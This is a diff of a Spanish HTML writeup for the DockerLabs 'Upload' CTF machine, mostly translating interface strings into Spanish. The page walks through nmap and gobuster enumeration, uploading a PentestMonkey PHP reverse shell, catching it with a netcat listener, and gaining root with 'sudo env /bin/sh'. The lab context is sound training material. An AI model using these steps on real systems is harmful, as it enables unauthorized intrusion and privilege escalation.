@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Upload — DockerLabs Writeup | Brandeiks</title>
-  <meta name="description" content="Writeup de la máquina Upload de DockerLabs — Dificultad: Fácil. File Upload sin restricciones → PHP Reverse Shell → sudo env /bin/sh → root.">
+  <meta name="description" content="Writeup de la máquina Upload de DockerLabs — Dificultad: Fácil. Subida de Archivos sin restricciones → PHP Reverse Shell → sudo env /bin/sh → root.">
   <meta name="author" content="Brandon Zevallos Pastrana">
   <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
@@ -105,8 +105,8 @@
     .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
     .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
     .badge-facil  { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
-    .badge-dl     { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
-    .badge-lin    { color: var(--blue);  border-color: rgba(79,195,247,0.3);  background: rgba(79,195,247,0.05); }
+    .badge-docker     { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .badge-linux    { color: var(--blue);  border-color: rgba(79,195,247,0.3);  background: rgba(79,195,247,0.05); }
     .badge-php    { color: var(--purple); border-color: rgba(191,95,255,0.3);  background: rgba(191,95,255,0.05); }
     .badge-nmap   { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
     .badge-rce    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
@@ -141,7 +141,7 @@
     .val-facil  { color: #00ffcc; }
     .val-purple { color: var(--purple); }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -312,13 +312,14 @@
   <div class="progress-bar" id="readingProgress"></div>
 </div>
 
-<a href="#main" class="skip-link">Skip to content</a>
+<a href="#main" class="skip-link">Saltar al contenido</a>
 
 <!-- NAV -->
 <nav>
-  <a href="#" class="nav-logo">BRANDEIKS</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <header class="writeup-hero">
@@ -326,21 +327,21 @@
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
     <div class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">dockerlabs</a> /
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">dockerlabs</a> /
       <span>upload</span>
     </div>
     <h1 class="writeup-title"><span>UPLOAD</span></h1>
-    <p class="writeup-subtitle">// File Upload sin restricciones → PHP Reverse Shell → Privilege Escalation → root</p>
+    <p class="writeup-subtitle">// Subida de archivos sin restricciones → Reverse shell en PHP → Escalada de privilegios → root</p>
     <div class="writeup-meta">
-      <span class="meta-badge badge-facil">FÁCIL</span>
-      <span class="meta-badge badge-dl">DOCKERLABS</span>
-      <span class="meta-badge badge-lin">LINUX</span>
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-docker">DOCKERLABS</span>
+      <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-rce">RCE</span>
       <span class="meta-badge badge-php">PHP SHELL</span>
       <span class="meta-badge badge-nmap">NMAP</span>
-      <span class="meta-date">// 13 JUN 2026</span>
+      <span class="meta-date">📅 Junio 2026 · Por Brandeiks</span>
     </div>
   </div>
 </header>
@@ -394,8 +395,8 @@
           <tr><td>Dificultad</td><td style="color:#00ffcc">FÁCIL</td></tr>
           <tr><td>OS</td><td style="color:var(--blue)">Linux (Ubuntu)</td></tr>
           <tr><td>Servicios</td><td>HTTP (80) — Apache 2.4.52</td></tr>
-          <tr><td>Técnicas</td><td>File Upload → RCE → sudo PrivEsc</td></tr>
-          <tr><td>Vector inicial</td><td style="color:var(--red)">Unrestricted File Upload</td></tr>
+          <tr><td>Técnicas</td><td>Subida de archivos → RCE → sudo PrivEsc</td></tr>
+          <tr><td>Vector inicial</td><td style="color:var(--red)">Unrestricted Subida de archivos</td></tr>
           <tr><td>PrivEsc</td><td style="color:var(--purple)">sudo /usr/bin/env → GTFObins</td></tr>
         </tbody>
       </table>
@@ -422,7 +423,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX upload.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">KALI</span>
         <div>
           <span class="prompt">┌──(kali㉿kali)-[~/Desktop/upload]<br>└─$ </span>
@@ -465,7 +466,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl upload.xml > upload.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">KALI</span>
         <div>
           <span class="prompt">└─$ </span>
@@ -502,7 +503,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x html,php,sh,py">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">KALI</span>
         <div>
           <span class="prompt">└─$ </span>
@@ -565,14 +566,14 @@
     <!-- EXPLOTACIÓN -->
     <div class="section" id="explotacion">
       <p class="section-label">// 04</p>
-      <h2 class="section-title">Explotación — Reverse Shell</h2>
+      <h2 class="section-title">Explotación — Reverse shell</h2>
       <div class="section-line"></div>
 
       <div class="prose">
         <p>
-          El vector de ataque es un <span class="hl-red">Unrestricted File Upload</span>: el servidor acepta
+          El vector de ataque es un <span class="hl-red">Unrestricted Subida de archivos</span>: el servidor acepta
           cualquier tipo de archivo sin validar la extensión ni el contenido. Subiremos un
-          <span class="hl-pur">PHP Reverse Shell</span> usando el payload de <strong>PentestMonkey</strong>,
+          <span class="hl-pur">Reverse shell en PHP</span> usando el payload de <strong>PentestMonkey</strong>,
           obtenido desde <span class="hl-cyan">revshells.com</span>.
         </p>
       </div>
@@ -591,14 +592,14 @@
       </div>
 
       <div class="cmd-block" data-cmd="nano revershell.php">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">KALI</span>
         <div><span class="prompt">└─$ </span><span class="cmd">nano <span class="arg">revershell.php</span></span></div>
       </div>
 
       <div class="output-block">
         <div><span class="o-purple">&lt;?php</span></div>
-        <div><span class="o-green">// php-reverse-shell — A Reverse Shell implementation in PHP.</span></div>
+        <div><span class="o-green">// php-reverse-shell — A Reverse shell implementation in PHP.</span></div>
         <div><span class="o-green">// https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></div>
         <div>&nbsp;</div>
         <div>set_time_limit (0);</div>
@@ -631,7 +632,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nc -lvnp 4444">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">KALI</span>
         <div><span class="prompt">└─$ </span><span class="cmd">sudo nc <span class="flag">-lvnp</span> <span class="arg">4444</span></span></div>
       </div>
@@ -675,7 +676,7 @@
     <!-- ESCALADA DE PRIVILEGIOS -->
     <div class="section" id="privesc">
       <p class="section-label">// 05</p>
-      <h2 class="section-title">Escalada de Privilegios</h2>
+      <h2 class="section-title">Escalada de privilegios</h2>
       <div class="section-line"></div>
 
       <div class="prose">
@@ -691,7 +692,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo -l">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VICTIM</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo <span class="flag">-l</span></span></div>
       </div>
@@ -740,7 +741,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo env /bin/sh">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VICTIM</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo env <span class="arg">/bin/sh</span></span></div>
       </div>
@@ -837,12 +838,12 @@
       <div class="glosario-grid">
 
         <div class="glos-card">
-          <div class="glos-term">Unrestricted File Upload</div>
-          <div class="glos-def"><strong>Unrestricted File Upload</strong> es una vulnerabilidad web donde el servidor permite subir archivos sin validar su tipo, extensión o contenido. Un atacante puede subir un <strong>webshell PHP</strong> (o en cualquier lenguaje ejecutado por el servidor) y luego acceder a él vía HTTP para ejecutar comandos en el sistema. Es parte del <strong>OWASP Top 10</strong> bajo la categoría A03:2021 — Injection. La mitigación incluye: validar el tipo MIME real, restringir extensiones, almacenar fuera del webroot, y renombrar archivos al subirlos.</div>
+          <div class="glos-term">Unrestricted Subida de archivos</div>
+          <div class="glos-def"><strong>Unrestricted Subida de archivos</strong> es una vulnerabilidad web donde el servidor permite subir archivos sin validar su tipo, extensión o contenido. Un atacante puede subir un <strong>webshell PHP</strong> (o en cualquier lenguaje ejecutado por el servidor) y luego acceder a él vía HTTP para ejecutar comandos en el sistema. Es parte del <strong>OWASP Top 10</strong> bajo la categoría A03:2021 — Injection. La mitigación incluye: validar el tipo MIME real, restringir extensiones, almacenar fuera del webroot, y renombrar archivos al subirlos.</div>
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Reverse Shell</div>
+          <div class="glos-term">Reverse shell</div>
           <div class="glos-def">Una <strong>reverse shell</strong> es una conexión donde la <em>máquina víctima</em> se conecta de vuelta hacia el <em>atacante</em>. Esto permite evadir firewalls que bloquean conexiones entrantes pero permiten las salientes. El atacante abre un listener (<code>nc -lvnp 4444</code>) y cuando el payload PHP se ejecuta, la víctima establece la conexión TCP. El resultado es una terminal de comandos interactiva en la máquina del atacante.</div>
         </div>
 
@@ -857,7 +858,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">sudo -l y Escalada de Privilegios</div>
+          <div class="glos-term">sudo -l y Escalada de privilegios</div>
           <div class="glos-def"><code>sudo -l</code> lista los comandos que el usuario actual puede ejecutar como root (u otro usuario) sin necesidad de contraseña, según <code>/etc/sudoers</code>. La misconfiguration más común es permitir <strong>NOPASSWD</strong> en binarios que pueden lanzar shells, como <code>vim</code>, <code>python</code>, <code>env</code>, <code>find</code>, etc. Si www-data puede ejecutar cualquiera de estos con sudo, un atacante obtiene acceso root trivialmente.</div>
         </div>
 
@@ -890,7 +891,7 @@
         <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
         <li><a href="#enumeracion">03 · Enumeración Web</a></li>
         <li><a href="#explotacion">04 · Explotación</a></li>
-        <li><a href="#privesc">05 · Escalada de Privilegios</a></li>
+        <li><a href="#privesc">05 · Escalada de privilegios</a></li>
         <li><a href="#referencia">06 · Referencia</a></li>
         <li><a href="#glosario">07 · Glosario</a></li>
       </ul>
@@ -916,7 +917,7 @@
       </div>
       <div class="info-row">
         <span class="info-label">VECTOR</span>
-        <span class="info-val val-red">File Upload</span>
+        <span class="info-val val-red">Subida de archivos</span>
       </div>
       <div class="info-row">
         <span class="info-label">PRIVESC</span>
@@ -925,7 +926,7 @@
     </div>
 
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item">
           <div class="ap-dot"></div>
@@ -964,9 +965,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de upload · DockerLabs</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
